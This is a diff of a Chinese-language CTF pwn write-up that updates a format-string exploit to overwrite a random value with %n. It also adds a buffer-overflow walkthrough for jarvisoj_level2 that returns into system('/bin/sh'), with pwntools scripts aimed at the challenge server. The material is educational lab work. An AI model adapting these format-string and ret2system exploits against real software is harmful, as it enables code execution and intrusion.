@@ -765,6 +765,8 @@ flag{ab0c2d86-23b2-4460-b29f-a7d2975812d6}
 
 [CTF Wiki - Format String](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/)
 
+[PWN学习之格式化字符串及CTF常见利用手法](https://www.freebuf.com/geek/391911.html)
+
 当程序使用 `printf(user_input)` 时，如果用户输入包含格式化字符（如 `%s`, `%x`, `%n`），会触发以下风险：
 
 - `%s`：读取任意地址数据
@@ -796,25 +798,93 @@ Hello,AAAA.0xff94c828.0x63.(nil).0xff94c84e.0x3.0xc2.0xf7de691b.0xff94c84e.0xff9
 from pwn import *
 
 host = "node5.buuoj.cn"
-port = 28774
+port = 29393
 
+context.log_level = 'debug'
 
 # p = process('./pwn')
 sh = remote(host, port)
 
-rand_address = 0x804C044
+# rand_address_start = 0x804C044
 
+payload = b""
+payload += p32(0x804C044)
 
-payload = p32(rand_address) + b'%10$s'
+payload += b'%10$n'
 
 sh.sendlineafter('your name:', payload)
 rec_data = sh.recvuntil(b"your passwd:")
-print(rec_data)
-idx = rec_data.find(b'Hello,') + len(b'Hello,')
-print(rec_data[idx + 4: idx + 8])
-print(u32(rec_data[idx + 4: idx + 8]))
-print(str(u32(rec_data[idx + 4: idx + 8])).encode())
+sh.sendline(str(4))
 
 sh.interactive()
+```
+
+32位，所以长度是4，原理就是：
+
+随机数生成在`0x804C044`，所以直接向这个地址写入，就可以覆盖这个随机数：
+
+```python
+payload += p32(0x804C044) 
+
+payload += b'%10$n' # 向第10个位置写入4
+```
+
+然后发送4就得到flag了qwq
+
+
+## jarvisoj_level2
+
+```sh
+[*] '/home/wuko233/Projects/pwn/jarvisoj_level2/level2'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+```
+
+```c
+ssize_t vulnerable_function()
+{
+  char buf[136]; // [esp+0h] [ebp-88h] BYREF
+
+  system("echo Input:");
+  return read(0, buf, 256u);
+}
+```
+
+读256，但是缓冲区只有136，同时居然还用着system()...
 
 ```
+.plt:08048320 ; int system(const char *command)
+```
+
+和[jarvisoj_level0](#jarvisoj_level0-read)一样，read()漏洞。
+
+shellcode在`0804A024`：
+
+```
+.data:0804A024 hint            db '/bin/sh',0
+```
+
+```python
+from pwn import *
+
+host = "node5.buuoj.cn"
+port = 26567
+
+context.log_level = 'debug'
+
+sh = remote(host, port)
+
+payload = b'q'*(136 + 4)
+payload += p32(0x8048320) # _system()
+payload += p32(0)
+payload += p32(0x804A024) # str: bin/sh
+sh.recvuntil(b"Input:")
+sh.sendline(payload)
+sh.interactive()
+```
+
+利用system函数执行bin/sh，其中0是指定的system()的返回地址，因为要进shell，注定不会返回，所以可以瞎写一串数字，后接传入的参数。
